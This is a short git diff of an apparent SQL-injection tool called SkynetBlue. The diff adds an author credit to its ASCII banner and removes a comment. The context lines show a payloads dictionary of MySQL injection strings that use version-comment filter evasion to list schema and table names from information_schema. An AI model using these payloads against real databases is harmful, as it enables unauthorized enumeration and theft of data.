@@ -14,11 +14,11 @@ class SkynetBlue:
 ░   ░▒   ▒    ░   ▒   ░░▒░▒   ▒▒       ▒░     ▒   ▒    ▒▒▓    ▒   ░      
     ░    ▒      ▒   ░▒░   ░    ▒     ▒▒   ░░   ░░     ░   ▒░   ░   ▒   
 ░           ░    ░░   ░    ░     ▒        ░     ░   ░    ░   ░    ░    
-░   ░         ░    ░    ░        ░    ░           ░      ░         ░             
+░   ░         ░    ░    ░        ░    ░           ░      ░         ░    criado por= crypt01lord         
 ░                                           ░
 """, "cyan")
 
-        # Payloads azuis
+    
         self.payloads = {
             "dblist":  "/*!50000CONCAT*/(0x7e,/*!50000GROUP_CONCAT*/(schema_name SEPARATOR 0x7c7c),0x7e)/*!50000FROM*/information_schema.schemata",
             "tbllist": "/*!50000CONCAT*/(0x7e,/*!50000GROUP_CONCAT*/(table_name SEPARATOR 0x7c7c),0x7e)/*!50000FROM*/information_schema.tables WHERE table_schema=0x{}",
@@ -87,4 +87,5 @@ if __name__ == "__main__":
     try:
         SkynetBlue().run()
     except KeyboardInterrupt:
+
         print(colored("\n [!] Interrompido pelo usuário", "red"))
